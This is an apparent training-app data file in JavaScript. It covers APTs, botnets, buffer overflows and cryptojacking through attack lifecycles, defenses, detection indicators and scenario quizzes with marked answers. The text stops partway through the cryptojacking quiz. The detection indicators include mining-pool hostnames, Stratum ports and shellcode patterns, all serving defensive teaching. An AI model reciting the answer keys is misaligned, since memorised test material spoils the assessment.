/**
 * ThreatAppletData.js — Complete Threat Intelligence Data for Shield House
 *
 * 28 threat topics with overview, attack flow, defense, and quiz data
 * Used by ThreatAppletRenderer.js
 */
const ThreatAppletData = {

    // =================================================================
    // 1. ADVANCED PERSISTENT THREATS (APT)
    // =================================================================
    APT: {
        code: 'APT',
        title: 'Advanced Persistent Threats',
        icon: '\u{1F3AF}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Prolonged, targeted cyberattacks where an intruder gains access to a network and remains undetected for an extended period to steal data.',
        overview: {
            what: 'An Advanced Persistent Threat (APT) is a sophisticated, sustained cyberattack in which an attacker establishes an undetected presence in a network to steal sensitive data over a long period. Unlike opportunistic attacks, APTs are carefully planned campaigns typically backed by nation-states or well-funded criminal organizations.',
            keyPoints: [
                'Attackers maintain long-term access (months to years)',
                'Targets are specifically chosen for strategic value',
                'Multiple attack vectors and custom malware are used',
                'Data exfiltration happens slowly to avoid detection',
                'Attackers adapt tactics when discovered'
            ],
            examples: [
                { name: 'APT29 (Cozy Bear)', detail: 'Russian SVR-linked group behind the SolarWinds supply chain attack (2020), compromising 18,000+ organizations including U.S. government agencies.' },
                { name: 'APT41 (Double Dragon)', detail: 'Chinese state-sponsored group conducting both espionage and financially motivated attacks against healthcare, telecom, and technology sectors.' },
                { name: 'APT28 (Fancy Bear)', detail: 'Russian GRU-linked group responsible for DNC hack (2016), Olympic targeting, and ongoing NATO-focused espionage campaigns.' }
            ],
            stats: [
                { label: 'Avg. dwell time', value: '21 days', note: 'Mandiant M-Trends 2024' },
                { label: 'Avg. cost per breach', value: '$4.88M', note: 'IBM Cost of a Data Breach 2024' },
                { label: 'Nation-state attributed', value: '~23%', note: 'of all breaches (Verizon DBIR)' }
            ]
        },
        attackFlow: {
            title: 'APT Attack Lifecycle',
            steps: [
                { phase: 'Reconnaissance', description: 'Attacker researches the target organization, identifies key personnel, maps network infrastructure, and gathers OSINT from social media, job postings, and public records.', icon: '\u{1F50D}' },
                { phase: 'Initial Compromise', description: 'Gains first foothold via spear phishing, watering hole attacks, or exploiting public-facing vulnerabilities. Custom malware or zero-day exploits may be used.', icon: '\u{1F4E7}' },
                { phase: 'Establish Foothold', description: 'Installs backdoors, RATs (Remote Access Trojans), and command-and-control (C2) channels. Creates persistence mechanisms to survive reboots and patches.', icon: '\u{1F3D7}' },
                { phase: 'Privilege Escalation', description: 'Escalates from initial user account to admin/root access. Exploits misconfigurations, credential theft (pass-the-hash), or local privilege escalation vulnerabilities.', icon: '\u{2B06}' },
                { phase: 'Lateral Movement', description: 'Moves through the network using stolen credentials, RDP, SMB, or WMI. Maps internal systems and locates high-value data stores.', icon: '\u{27A1}' },
                { phase: 'Data Exfiltration', description: 'Slowly extracts data through encrypted C2 channels, DNS tunneling, or steganography. Data is staged and compressed to minimize detection.', icon: '\u{1F4E4}' },
                { phase: 'Maintain Presence', description: 'Cleans logs, updates tools, and establishes multiple redundant access methods. Returns periodically for continued collection.', icon: '\u{1F504}' }
            ]
        },
        defense: {
            detection: [
                'Network traffic analysis for anomalous C2 beaconing patterns',
                'Endpoint Detection and Response (EDR) for behavioral anomalies',
                'SIEM correlation of authentication events across systems',
                'DNS monitoring for tunneling and DGA (Domain Generation Algorithm) domains',
                'User and Entity Behavior Analytics (UEBA) for lateral movement'
            ],
            prevention: [
                'Defense-in-depth architecture with network segmentation',
                'Zero Trust access model with continuous verification',
                'Regular patching and vulnerability management program',
                'Multi-factor authentication on all privileged accounts',
                'Application whitelisting and endpoint hardening'
            ],
            response: [
                'Activate incident response team and engage threat intelligence',
                'Isolate compromised systems without alerting the attacker',
                'Perform forensic analysis to map full scope of compromise',
                'Coordinate with law enforcement and intelligence sharing (ISACs)',
                'Rebuild affected systems from known-good images, rotate all credentials'
            ]
        },
        indicators: {
            network: [
                'Unusual outbound connections to rare or newly registered domains',
                'DNS queries to domains generated by Domain Generation Algorithms (DGAs)',
                'Periodic beaconing traffic at consistent intervals to C2 infrastructure',
                'Large data transfers during off-hours or to unexpected geographic regions',
                'Encrypted traffic to non-standard ports or IP addresses with no prior history'
            ],
            host: [
                'Unknown scheduled tasks, services, or registry run keys for persistence',
                'Suspicious DLL sideloading or process injection in legitimate processes',
                'Modified timestamps on system files (timestomping)',
                'Unexpected local admin accounts or changes to group memberships',
                'PowerShell execution with encoded commands or bypass flags'
            ],
            behavioral: [
                'User accounts active during unusual hours or from atypical locations',
                'Lateral movement patterns: one account authenticating to many systems rapidly',
                'Privileged credential usage from non-administrative workstations',
                'Access to sensitive file shares not aligned with job role',
                'Email account forwarding rules created to external addresses'
            ],
            tools: ['MITRE ATT&CK Navigator', 'Velociraptor', 'Volatility (memory forensics)', 'YARA rules', 'Zeek (network analysis)', 'Elastic SIEM', 'CrowdStrike Falcon', 'Carbon Black']
        },
        interactive: {
            scenario: 'Your SIEM alerts on a service account authenticating to 47 different servers over the past 3 hours between 2:00 AM and 5:00 AM. The account normally accesses only 3 database servers during business hours. Network logs show small, periodic HTTPS connections to a recently registered .xyz domain every 4 minutes from one of those servers. What is the MOST likely situation and best immediate response?',
            options: [
                'A system administrator is running a scheduled maintenance script — no action needed',
                'This matches APT lateral movement and C2 beaconing patterns — isolate the source server, preserve evidence, and activate the incident response team',
                'The service account password has expired and is retrying connections — reset the password',
                'A software update is being distributed across the network — verify with IT operations'
            ],
            correct: 1,
            explanation: 'The combination of indicators is textbook APT: a service account used for lateral movement across many systems (47 vs. normal 3) during off-hours, plus periodic beaconing (every 4 minutes) to a newly registered domain. Each indicator alone might be benign, but together they strongly suggest compromise. Immediate isolation and evidence preservation are critical before the attacker can detect your response and destroy evidence.'
        },
        quiz: [
            { question: 'What primarily distinguishes an APT from a standard cyberattack?', options: ['APTs use more expensive tools', 'APTs are sustained, targeted campaigns that maintain long-term access', 'APTs only target government networks', 'APTs always use zero-day exploits'], correct: 1, explanation: 'APTs are defined by their persistent, targeted nature — attackers maintain long-term undetected access, unlike opportunistic attacks that smash-and-grab.' },
            { question: 'During which phase of an APT lifecycle does the attacker typically install backdoors and establish C2 channels?', options: ['Reconnaissance', 'Initial Compromise', 'Establish Foothold', 'Data Exfiltration'], correct: 2, explanation: 'The "Establish Foothold" phase is when attackers install persistence mechanisms like backdoors and C2 channels to maintain access after the initial compromise.' },
            { question: 'APT29 (Cozy Bear) is attributed to which nation-state?', options: ['China', 'North Korea', 'Russia', 'Iran'], correct: 2, explanation: 'APT29 (Cozy Bear) is linked to Russia\'s SVR (Foreign Intelligence Service) and was behind the SolarWinds supply chain attack.' },
            { question: 'Which technique is MOST effective at detecting lateral movement in an APT campaign?', options: ['Antivirus signature scanning', 'Firewall rules on the perimeter', 'SIEM correlation of authentication events across systems', 'Email filtering'], correct: 2, explanation: 'Lateral movement involves moving between internal systems using stolen credentials. SIEM correlation can detect unusual authentication patterns across multiple hosts.' },
            { question: 'Why do APT actors exfiltrate data slowly rather than in one large transfer?', options: ['Their internet connection is slow', 'To avoid triggering data loss prevention and network monitoring alerts', 'The data is too large to transfer at once', 'They need to decrypt the data first'], correct: 1, explanation: 'Slow exfiltration keeps data volumes below DLP thresholds and blends with normal traffic patterns, making detection much harder.' },
            { question: 'Which security model is MOST effective against APT lateral movement?', options: ['Castle-and-moat (perimeter defense)', 'Zero Trust with continuous verification', 'Honeypot-based detection', 'Air-gapped networks only'], correct: 1, explanation: 'Zero Trust assumes breach and requires continuous verification for every access request, limiting an attacker\'s ability to move laterally even after gaining initial access.' }
        ]
    },

    // =================================================================
    // 2. BOTNETS
    // =================================================================
    BOTNETS: {
        code: 'BOTNETS',
        title: 'Botnets',
        icon: '\u{1F916}',
        severity: 'high',
        color: '#a855f7',
        description: 'Networks of compromised computers (bots/zombies) controlled remotely by an attacker (botmaster) to perform coordinated malicious activities.',
        overview: {
            what: 'A botnet is a network of internet-connected devices infected with malware that allows a remote attacker (the botmaster or bot herder) to control them collectively. These zombie machines can number from hundreds to millions and are used for DDoS attacks, spam campaigns, credential stuffing, cryptomining, and data theft.',
            keyPoints: [
                'Bots communicate with Command & Control (C2) infrastructure',
                'Modern botnets use peer-to-peer (P2P) to avoid single points of failure',
                'IoT devices are increasingly recruited due to weak security',
                'Botnet-as-a-Service (BaaS) makes botnets available for rent',
                'Takedowns require coordinated international law enforcement action'
            ],
            examples: [
                { name: 'Mirai (2016)', detail: 'Infected 600,000+ IoT devices using default credentials, launched record 1.2 Tbps DDoS against Dyn DNS, disrupting Twitter, Netflix, and Reddit.' },
                { name: 'Emotet', detail: 'Originally a banking trojan, evolved into a botnet-as-a-service platform distributing TrickBot and Ryuk ransomware. Taken down in 2021, resurged in 2022.' },
                { name: 'Zeus/Zbot', detail: 'Banking trojan botnet that infected 3.6M+ U.S. computers. Stole $100M+ from bank accounts via man-in-the-browser attacks.' }
            ],
            stats: [
                { label: 'Active botnets tracked', value: '10,000+', note: 'Spamhaus 2024' },
                { label: 'Mirai peak attack', value: '1.2 Tbps', note: 'Dyn DNS DDoS (2016)' },
                { label: 'IoT bot infections', value: '1.5M+', note: 'daily attempts (NETSCOUT)' }
            ]
        },
        attackFlow: {
            title: 'Botnet Lifecycle',
            steps: [
                { phase: 'Infection Vector', description: 'Malware spreads via phishing emails, drive-by downloads, exploit kits, or scanning for devices with default credentials (especially IoT).', icon: '\u{1F41B}' },
                { phase: 'Installation & Persistence', description: 'Bot malware installs on the victim device, hides from detection, and establishes persistence through registry keys, scheduled tasks, or rootkit techniques.', icon: '\u{1F4BE}' },
                { phase: 'C2 Registration', description: 'The infected device phones home to the C2 server, registering itself and receiving initial configuration. Modern botnets use DNS fast-flux, Tor, or P2P for resilience.', icon: '\u{1F4E1}' },
                { phase: 'Command Reception', description: 'Bot waits for instructions from the botmaster. Commands are distributed via IRC, HTTP, P2P protocols, or social media dead drops.', icon: '\u{1F4E9}' },
                { phase: 'Attack Execution', description: 'Bots execute coordinated attacks: DDoS floods, spam campaigns, credential stuffing, cryptomining, or spreading to additional targets.', icon: '\u{26A1}' },
                { phase: 'Evasion & Update', description: 'Botmaster updates malware to evade new signatures, rotates C2 infrastructure, and patches vulnerabilities in the bot code to prevent rival takeovers.', icon: '\u{1F6E1}' }
            ]
        },
        defense: {
            detection: [
                'Monitor for unusual outbound connections (C2 beaconing patterns)',
                'DNS sinkholing to identify bots querying known C2 domains',
                'Network flow analysis for abnormal traffic volumes from internal hosts',
                'IDS/IPS signatures for known botnet protocols and payloads',
                'Behavioral analysis of devices suddenly generating high volumes of traffic'
            ],
            prevention: [
                'Change default credentials on all IoT devices immediately after deployment',
                'Network segmentation to isolate IoT devices from critical systems',
                'Automated patch management to close exploitation vectors',
                'Email security gateways with sandboxing for attachment analysis',
                'Egress filtering to block unauthorized outbound communications'
            ],
            response: [
                'Identify all infected hosts through C2 traffic analysis and IOC scanning',
                'Isolate infected devices from the network immediately',
                'Reimage compromised systems rather than attempting malware removal',
                'Block C2 domains/IPs at firewall and DNS levels',
                'Report to ISACs and participate in coordinated takedown efforts'
            ]
        },
        indicators: {
            network: [
                'Outbound connections to known C2 domains or IP addresses on threat intel feeds',
                'IRC traffic or unusual protocol usage on non-standard ports',
                'DNS fast-flux patterns: domain resolving to rapidly changing IP addresses',
                'High volume of outbound connection attempts (scanning for new targets)',
                'Traffic to Tor exit nodes or known proxy/anonymization services'
            ],
            host: [
                'Unknown processes consuming CPU or network resources',
                'Registry modifications for persistence (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)',
                'Disabled or tampered Windows Update and antivirus services',
                'New scheduled tasks or cron jobs running at system startup',
                'Modified hosts file entries redirecting security vendor domains'
            ],
            behavioral: [
                'Devices generating unusually high outbound traffic volumes',
                'IoT devices communicating with external IPs they should not contact',
                'Multiple internal devices simultaneously connecting to the same external host',
                'Sudden spike in DNS queries from a single host',
                'Devices sending traffic at consistent intervals (heartbeat/check-in pattern)'
            ],
            tools: ['DNS Sinkholing', 'NetFlow/sFlow analysis', 'Suricata IDS', 'Shodan', 'GreyNoise', 'AbuseIPDB', 'Spamhaus DROP lists', 'Wireshark']
        },
        interactive: {
            scenario: 'Your network monitoring shows that 23 IP cameras on a dedicated IoT VLAN are making outbound HTTPS connections to the same IP address in Eastern Europe every 60 seconds. The cameras were installed 6 months ago and this traffic pattern started 3 days ago. Normal camera traffic only goes to your on-premises NVR. What should you do?',
            options: [
                'Update the camera firmware and monitor — it is probably a vendor telemetry check',
                'Block the external IP at the firewall and consider the issue resolved',
                'Isolate the IoT VLAN, block the C2 IP, factory reset all 23 cameras with new credentials, and scan for lateral movement to other VLANs',
                'Reboot all cameras to clear any temporary malware from memory'
            ],
            correct: 2,
            explanation: 'Twenty-three cameras simultaneously beaconing to the same foreign IP is a clear botnet infection — likely a Mirai variant exploiting default or weak credentials. Simply blocking the IP is insufficient because the malware will try alternate C2 channels. Full remediation requires isolation (stop further damage), blocking known C2, factory reset with credential hardening (eliminate the malware), and scanning for lateral movement (the botnet may have pivoted to your main network).'
        },
        quiz: [
            { question: 'What is the primary purpose of Command & Control (C2) infrastructure in a botnet?', options: ['To encrypt the botnet traffic', 'To allow the botmaster to issue commands to all bots', 'To store stolen data permanently', 'To provide internet access to the bots'], correct: 1, explanation: 'C2 infrastructure is the communication backbone that allows the botmaster to send commands to and receive data from the compromised bots.' },
            { question: 'The Mirai botnet primarily spread by exploiting what weakness?', options: ['Zero-day vulnerabilities in Windows', 'Default credentials on IoT devices', 'SQL injection in web applications', 'Phishing emails with macro attachments'], correct: 1, explanation: 'Mirai scanned the internet for IoT devices using factory-default usernames and passwords (like admin/admin), infecting over 600,000 devices.' },
            { question: 'Why are modern botnets increasingly using P2P communication instead of centralized C2 servers?', options: ['P2P is faster than client-server', 'P2P eliminates single points of failure that can be taken down', 'P2P uses less bandwidth', 'P2P is required by most malware frameworks'], correct: 1, explanation: 'Centralized C2 can be taken down by law enforcement or security researchers. P2P architectures distribute control across the botnet, making takedowns much harder.' },
            { question: 'What is "DNS fast-flux" in the context of botnets?', options: ['A technique to speed up DNS queries', 'Rapidly changing DNS records to hide C2 server locations', 'A method of encrypting DNS traffic', 'Using DNS to exfiltrate data'], correct: 1, explanation: 'Fast-flux rapidly rotates DNS A records among hundreds of bot IP addresses, making it extremely difficult to locate and block the actual C2 server.' },
            { question: 'Which defense is MOST effective against IoT botnet recruitment?', options: ['Installing antivirus on IoT devices', 'Changing default credentials and network segmentation', 'Using a VPN for IoT traffic', 'Disabling all IoT devices on the network'], correct: 1, explanation: 'Most IoT botnets exploit default credentials. Changing these and segmenting IoT into isolated network zones prevents both initial infection and lateral movement.' },
            { question: 'What is Botnet-as-a-Service (BaaS)?', options: ['A cloud provider offering bot hosting', 'Criminal services that rent out botnet access to other attackers', 'A legitimate penetration testing service', 'Automated bot detection software'], correct: 1, explanation: 'BaaS is a criminal business model where botnet operators rent access to their compromised device networks to other attackers for DDoS, spam, or other malicious campaigns.' }
        ]
    },

    // =================================================================
    // 3. BUFFER OVERFLOW
    // =================================================================
    BUFFER_OVERFLOW: {
        code: 'BUFFER_OVERFLOW',
        title: 'Buffer Overflow',
        icon: '\u{1F4A5}',
        severity: 'critical',
        color: '#a855f7',
        description: 'A vulnerability where a program writes data beyond the allocated memory buffer, potentially allowing attackers to execute arbitrary code or crash the system.',
        overview: {
            what: 'A buffer overflow occurs when a program writes more data to a memory buffer than it can hold, overwriting adjacent memory. This can corrupt data, crash the program, or — most dangerously — allow an attacker to inject and execute malicious code by overwriting the instruction pointer (EIP/RIP) to redirect program execution.',
            keyPoints: [
                'Root cause: lack of bounds checking on input data',
                'Stack-based overflows target the call stack (return addresses)',
                'Heap-based overflows target dynamically allocated memory',
                'Commonly found in C and C++ programs lacking memory safety',
                'Modern mitigations include ASLR, DEP/NX, stack canaries, and CFI'
            ],
            examples: [
                { name: 'Morris Worm (1988)', detail: 'First major internet worm exploited a buffer overflow in Unix fingerd. Infected ~6,000 computers (10% of the internet at the time).' },
                { name: 'Code Red (2001)', detail: 'Exploited buffer overflow in Microsoft IIS web server. Infected 359,000 servers in 14 hours and defaced websites with "Hacked by Chinese!".' },
                { name: 'Heartbleed (2014)', detail: 'Buffer over-read in OpenSSL\'s heartbeat extension allowed attackers to read 64KB of server memory per request, exposing private keys and session data.' }
            ],
            stats: [
                { label: 'CVEs related to buffer overflow', value: '~20%', note: 'of all reported vulnerabilities (MITRE)' },
                { label: 'Memory safety bugs', value: '~70%', note: 'of Microsoft/Chrome security bugs' },
                { label: 'Morris Worm impact', value: '$10-100M', note: 'estimated damage (1988 dollars)' }
            ]
        },
        attackFlow: {
            title: 'Buffer Overflow Exploitation',
            steps: [
                { phase: 'Vulnerability Discovery', description: 'Attacker identifies a program that accepts user input without proper bounds checking. Fuzzing tools send malformed input to find crash points.', icon: '\u{1F50E}' },
                { phase: 'Buffer Analysis', description: 'Attacker determines the buffer size, memory layout, and distance to the return address (EIP/RIP offset). Debuggers like GDB or x64dbg are used.', icon: '\u{1F4CF}' },
                { phase: 'Payload Construction', description: 'Crafts shellcode (machine code) that performs the desired action (reverse shell, file download, privilege escalation). NOP sleds may increase reliability.', icon: '\u{1F528}' },
                { phase: 'Exploit Delivery', description: 'Sends specially crafted input that fills the buffer, overwrites the return address, and points execution to the shellcode.', icon: '\u{1F4E8}' },
                { phase: 'Code Execution', description: 'When the vulnerable function returns, execution jumps to the attacker\'s shellcode instead of the legitimate return address.', icon: '\u{26A1}' },
                { phase: 'Post-Exploitation', description: 'Attacker gains code execution with the privileges of the vulnerable process. May escalate privileges, install backdoors, or pivot to other systems.', icon: '\u{1F510}' }
            ]
        },
        defense: {
            detection: [
                'Application crash analysis and core dump monitoring',
                'Runtime application self-protection (RASP) detecting memory anomalies',
                'IDS signatures for known exploit patterns (NOP sleds, shellcode)',
                'Static code analysis tools scanning for unsafe function usage',
                'Fuzzing programs during development to find overflow conditions'
            ],
            prevention: [
                'Use memory-safe languages (Rust, Go, Java, Python) for new development',
                'Enable compiler protections: stack canaries, ASLR, DEP/NX bit',
                'Replace unsafe functions (strcpy, gets, sprintf) with bounds-checked alternatives',
                'Implement Control Flow Integrity (CFI) to prevent ROP attacks',
                'Code review focusing on all user input handling paths'
            ],
            response: [
                'Patch the vulnerable software immediately upon exploit discovery',
                'Deploy virtual patches via WAF/IPS while awaiting vendor fix',
                'Perform forensic analysis to determine if the vulnerability was exploited',
                'Review logs for indicators of exploitation (crashes, unusual process behavior)',
                'Audit codebase for similar patterns in related functions'
            ]
        },
        indicators: {
            network: [
                'IDS signatures for NOP sled patterns (long sequences of 0x90 bytes) in network payloads',
                'Unusually large input fields in HTTP requests, FTP commands, or protocol headers',
                'Shellcode byte patterns in network traffic (common syscall sequences)',
                'Unexpected outbound connections from a server process immediately after receiving input',
                'Return-Oriented Programming (ROP) gadget chains in payloads'
            ],
            host: [
                'Application crashes (segmentation faults, access violations) in logs',
                'Core dump files appearing unexpectedly on servers',
                'Processes spawning unexpected child processes (e.g., web server spawning /bin/sh)',
                'Stack canary violation alerts from compiler-inserted protections',
                'DEP/NX violations logged by the operating system'
            ],
            behavioral: [
                'Service restarting repeatedly after crashes (possible fuzzing or exploitation attempts)',
                'Privileged process executing commands inconsistent with its function',
                'Unusual memory allocation patterns detected by RASP solutions',
                'Static analysis findings of unsafe C functions (strcpy, gets, sprintf) in codebase',
                'Anomalous system call sequences from application processes'
            ],
            tools: ['GDB / x64dbg (debugging)', 'Valgrind (memory analysis)', 'AddressSanitizer (ASan)', 'AFL / LibFuzzer (fuzzing)', 'Checksec (binary protections)', 'RASP solutions', 'Snort/Suricata (NOP sled detection)', 'SonarQube (static analysis)']
        },
        interactive: {
            scenario: 'Your web application firewall logs show repeated requests to a legacy C-based CGI endpoint. Each request contains progressively longer input strings in the "username" field — starting at 100 characters and incrementing by 50 each time, now at 2,500 characters. The last 5 requests caused HTTP 500 errors. Normal usernames are under 32 characters. What is happening and what should you do?',
            options: [
                'A user is having trouble logging in and pasting their password into the username field',
                'Someone is fuzzing the CGI endpoint to find the exact buffer overflow offset — block the source IP, disable the endpoint, and audit the C code for bounds checking',
                'The web application needs more memory allocated to handle long inputs',
                'This is an SQL injection attempt targeting the username field'
            ],
            correct: 1,
            explanation: 'The pattern is textbook buffer overflow reconnaissance: systematically increasing input length to find the exact size that causes a crash. The progression from 100 to 2,500 in increments of 50 is a classic fuzzing pattern. The HTTP 500 errors confirm the application is crashing — meaning the attacker has likely found the overflow point. The next step would be crafting a precise exploit with shellcode. Immediate action: block the attacker, take the vulnerable endpoint offline, and fix the bounds checking in the C code.'
        },
        quiz: [
            { question: 'What does a buffer overflow attacker typically try to overwrite to gain code execution?', options: ['The program\'s source code', 'The instruction pointer (return address) on the stack', 'The operating system kernel', 'The network interface card firmware'], correct: 1, explanation: 'By overwriting the return address (EIP on x86, RIP on x64), the attacker redirects execution to their shellcode when the current function returns.' },
            { question: 'Which programming languages are MOST susceptible to buffer overflow vulnerabilities?', options: ['Python and JavaScript', 'C and C++', 'Java and C#', 'Rust and Go'], correct: 1, explanation: 'C and C++ provide direct memory access without automatic bounds checking, making them inherently vulnerable to buffer overflows when developers forget to validate input sizes.' },
            { question: 'What is ASLR and how does it mitigate buffer overflows?', options: ['A firewall technology that blocks exploit traffic', 'Randomizes memory addresses so attackers can\'t predict where to jump', 'An encryption algorithm for memory contents', 'A compiler flag that removes buffer operations'], correct: 1, explanation: 'Address Space Layout Randomization (ASLR) randomizes the positions of the stack, heap, and libraries in memory, making it much harder for attackers to predict where their shellcode will land.' },
            { question: 'What is a NOP sled in buffer overflow exploitation?', options: ['A method of cleaning up after an exploit', 'A sequence of no-operation instructions that increase the chance of hitting shellcode', 'A technique for bypassing firewalls', 'A type of buffer used by network devices'], correct: 1, explanation: 'A NOP sled is a series of no-operation (0x90) instructions placed before shellcode. If execution lands anywhere in the sled, it "slides" down to the shellcode, increasing exploit reliability.' },
            { question: 'The Heartbleed vulnerability was technically which type of buffer issue?', options: ['Stack-based buffer overflow', 'Heap-based buffer overflow', 'Buffer over-read (reading beyond buffer bounds)', 'Integer overflow leading to buffer overflow'], correct: 2, explanation: 'Heartbleed was a buffer over-read — it read beyond the intended buffer boundary to expose up to 64KB of server memory per request, rather than writing beyond it.' },
            { question: 'Which mitigation prevents code execution even if an attacker successfully overwrites the return address?', options: ['ASLR alone', 'DEP/NX bit (Data Execution Prevention)', 'Stack canaries alone', 'Input validation'], correct: 1, explanation: 'DEP/NX marks memory regions as non-executable. Even if the attacker overwrites the return address and points to shellcode, the CPU refuses to execute code in data segments.' }
        ]
    },

    // =================================================================
    // 4. CRYPTOJACKING
    // =================================================================
    CRYPTOJACKING: {
        code: 'CRYPTOJACKING',
        title: 'Cryptojacking',
        icon: '\u{26CF}',
        severity: 'medium',
        color: '#a855f7',
        description: 'Unauthorized use of computing resources to mine cryptocurrency, often through browser-based scripts or installed malware.',
        overview: {
            what: 'Cryptojacking is the unauthorized use of someone else\'s computing resources to mine cryptocurrency. Attackers inject mining scripts into websites or install mining malware on victims\' devices. Unlike ransomware, cryptojacking operates silently — the attacker profits from stolen CPU/GPU cycles while victims experience degraded performance and increased electricity costs.',
            keyPoints: [
                'Two main types: browser-based (in-browser JavaScript miners) and host-based (installed malware)',
                'Monero (XMR) is preferred due to its privacy features and CPU-mineable algorithm',
                'Cloud environments are high-value targets due to scalable compute resources',
                'Often the first sign is unexplained CPU spikes and higher electricity bills',
                'Can cause hardware damage through sustained thermal stress'
            ],
            examples: [
                { name: 'Coinhive (2017-2019)', detail: 'Legitimate JavaScript miner intended for website monetization, but widely abused. Found on 30,000+ websites including government sites. Shut down in 2019.' },
                { name: 'Tesla Cloud Hack (2018)', detail: 'Attackers exploited an unsecured Kubernetes console to deploy cryptominers on Tesla\'s AWS infrastructure, mining cryptocurrency at Tesla\'s expense.' },
                { name: 'Graboid Worm (2019)', detail: 'First known cryptojacking worm spread through unsecured Docker Engine deployments, infecting 2,000+ Docker hosts for Monero mining.' }
            ],
            stats: [
                { label: 'YoY increase', value: '+399%', note: 'SonicWall 2023 report' },
                { label: 'Cloud cryptojacking', value: '#1 threat', note: 'Google Cloud Threat Horizons' },
                { label: 'Avg. detection time', value: '~ days to months', note: 'Often discovered via electricity bills' }
            ]
        },
        attackFlow: {
            title: 'Cryptojacking Attack Flow',
            steps: [
                { phase: 'Resource Identification', description: 'Attacker identifies targets with significant compute resources: cloud instances, servers, or high-traffic websites for browser-based mining.', icon: '\u{1F50D}' },
                { phase: 'Injection/Installation', description: 'Deploys mining payload via: (a) injecting JavaScript into websites/ads, (b) exploiting cloud misconfigurations, or (c) installing mining malware through phishing or exploit kits.', icon: '\u{1F489}' },
                { phase: 'Mining Configuration', description: 'Configures miner with attacker\'s wallet address, mining pool details, and throttle settings (often limiting CPU usage to avoid detection).', icon: '\u{2699}' },
                { phase: 'Silent Mining', description: 'Mining runs in the background. Browser-based miners execute while users visit the page; host-based miners run as services or scheduled tasks.', icon: '\u{26CF}' },
                { phase: 'Profit Collection', description: 'Mined cryptocurrency is sent to the attacker\'s wallet via mining pools. Monero\'s privacy features make transactions untraceable.', icon: '\u{1F4B0}' },
                { phase: 'Persistence & Evasion', description: 'Miner adjusts CPU usage during business hours, uses process injection to hide, and updates wallet addresses to complicate tracking.', icon: '\u{1F4A8}' }
            ]
        },
        defense: {
            detection: [
                'Monitor CPU and GPU utilization for sustained unexplained spikes',
                'Network monitoring for connections to known mining pool domains/IPs',
                'Cloud billing alerts for unexpected compute cost increases',
                'Browser extensions that detect and block in-page mining scripts',
                'Process monitoring for unknown or renamed mining executables'
            ],
            prevention: [
                'Ad blockers and anti-cryptomining browser extensions (minerBlock, No Coin)',
                'Secure cloud configurations — enforce authentication on all management consoles',
                'Container security scanning to detect mining images in registries',
                'Web Application Firewalls (WAF) to detect script injection attempts',
                'Resource quotas and alerts on cloud compute workloads'
            ],
            response: [
                'Terminate mining processes and remove malware/scripts immediately',
                'Audit cloud infrastructure for unauthorized instances or containers',
                'Reset credentials for any compromised cloud management consoles',
                'Review web server files for injected mining JavaScript',
                'Implement monitoring to catch recurrence (CPU alerts, network rules)'
            ]
        },
        indicators: {
            network: [
                'Connections to known cryptocurrency mining pool domains and IP addresses',
                'Stratum protocol traffic (stratum+tcp://) on ports 3333, 4444, 5555, or 8888',
                'WebSocket connections to mining pool endpoints from browser processes',
                'Increased bandwidth usage to mining-related domains flagged by threat intel',
                'DNS queries for mining pool hostnames (e.g., pool.minexmr.com, xmrpool.eu)'
            ],
            host: [
                'Sustained CPU usage at 70-100% with no corresponding legitimate workload',
                'Processes named to mimic system services (svchost.exe, systemd) consuming high CPU',
                'Mining binaries in temp directories (/tmp, %TEMP%, %APPDATA%)',
                'Configuration files containing wallet addresses and pool URLs',
                'GPU utilization spikes on servers that should not be doing graphics processing'
            ],
            behavioral: [
                'Cloud compute bills significantly higher than expected without corresponding workload increases',
                'Server fans running at high speed constantly, elevated thermal readings',
                'System performance degradation reported by users during business hours',
                'New containers or VM instances appearing in cloud environments without change tickets',
                'Mining processes that throttle CPU usage during business hours and increase overnight'
            ],
            tools: ['minerBlock (browser extension)', 'No Coin (browser extension)', 'CloudWatch / Azure Monitor (billing alerts)', 'htop / Process Explorer', 'CoinBlockerLists', 'Stratum protocol signatures for IDS', 'Container security scanning (Trivy, Aqua)', 'VirusTotal']
        },
        interactive: {
            scenario: 'Your cloud team notices that AWS costs have tripled this month. Investigation reveals 15 new EC2 instances (c5.4xlarge compute-optimized) running in a region your organization does not normally use. The instances were launched using an IAM key belonging to a developer who left the company 2 months ago. All 15 instances show sustained 98% CPU utilization. What happened and what steps do you take?',
            options: [
                'The former developer is running a personal project — terminate instances and close the IAM account',
                'An attacker compromised the former employee\'s IAM credentials to deploy cryptominers — terminate instances, revoke all IAM keys, audit CloudTrail logs, enforce MFA on all IAM accounts, and review offboarding procedures',
                'AWS launched these instances automatically as part of auto-scaling — adjust auto-scaling policies',
                'This is a billing error by AWS — open a support ticket'
            ],
            correct: 1,
            explanation: 'This is a textbook cloud cryptojacking incident. The indicators: compute-optimized instances (ideal for mining), unusual region (avoiding detection), 98% sustained CPU (mining workload), and credentials from a departed employee (poor offboarding). Full remediation requires: (1) terminate instances immediately, (2) revoke ALL the compromised user\'s credentials, (3) audit CloudTrail to find the initial access point and any other unauthorized activity, (4) enforce MFA on all IAM accounts, and (5) fix the offboarding process that left active credentials for a departed employee.'
        },
        quiz: [
            { question: 'Why do cryptojackers prefer mining Monero (XMR) over Bitcoin?', options: ['Bitcoin is less valuable', 'Monero is CPU-mineable and has built-in transaction privacy', 'Bitcoin mining is illegal', 'Monero has no transaction fees'], correct: 1, explanation: 'Monero uses the RandomX algorithm (CPU-friendly, no need for ASICs) and has built-in privacy features that hide transaction amounts and wallet addresses, making it ideal for illicit mining.' },
            { question: 'What was Coinhive?', options: ['A ransomware variant', 'A JavaScript cryptocurrency miner intended for website monetization', 'A botnet C2 framework', 'A cloud mining platform'], correct: 1, explanation: 'Coinhive was a legitimate JavaScript Monero miner meant to replace ads for revenue. However, it was widely injected into sites without consent, becoming the most prevalent cryptojacking tool until its shutdown in 2019.' },
            { question: 'An employee reports their computer fan runs constantly and performance is sluggish. What should you investigate first?', options: ['Hard drive failure', 'Network cable issues', 'CPU utilization and running processes for cryptomining malware', 'Monitor refresh rate settings'], correct: 2, explanation: 'Sustained high CPU usage with degraded performance is a classic indicator of cryptojacking. Check running processes for suspicious miners and network connections to mining pools.' },
            { question: 'How did attackers compromise Tesla\'s cloud infrastructure for cryptojacking?', options: ['Phishing Tesla employees', 'Exploiting an unsecured Kubernetes management console', 'Zero-day exploit in AWS', 'Physical access to Tesla data centers'], correct: 1, explanation: 'The attackers found a Kubernetes console without password protection, used it to deploy cryptomining containers on Tesla\'s AWS infrastructure.' },
